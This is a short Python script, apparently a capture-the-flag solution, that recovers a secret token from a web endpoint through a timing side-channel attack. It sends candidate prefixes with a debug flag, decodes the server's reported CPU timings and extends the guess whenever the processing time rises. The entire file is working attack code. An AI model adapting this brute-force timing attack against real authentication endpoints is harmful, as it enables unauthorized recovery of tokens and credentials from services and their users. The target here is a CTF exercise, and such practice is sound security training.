import requests
import base64

url = "http://ctf2.camscsc.org/4/bft/check/check.php"
alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0','.',',','?','/','<','>','!','@','#','$','^','&','*','(',')','-','+','=','[',']','{','}','\\','|','']
r = ""
cpu_start = ""
cpu_end = ""
start = ""
s = 0
end = ""
end = 0
a = 0
z = ''
n = 0
x = True
for j in range(20):
	for i in range(len(alphabet)):
		if x:
			if alphabet[i] == '':
				x = False
			else:
				r = requests.post(url, {'token': z + alphabet[i],'debug':'1'})
				cpu_start = r.json()['cpu_start']
				cpu_end = r.json()['cpu_end']
				start = base64.b64decode(cpu_start.encode('utf-8')).decode('utf-8')
				s = float(start) * 10000
				end = base64.b64decode(cpu_end.encode('utf-8')).decode('utf-8')
				e = float(end) * 10000
				a = e - s

				if (a > (n + 0.2)):
						z = z + alphabet[i]
						n = a
						break
print(z)
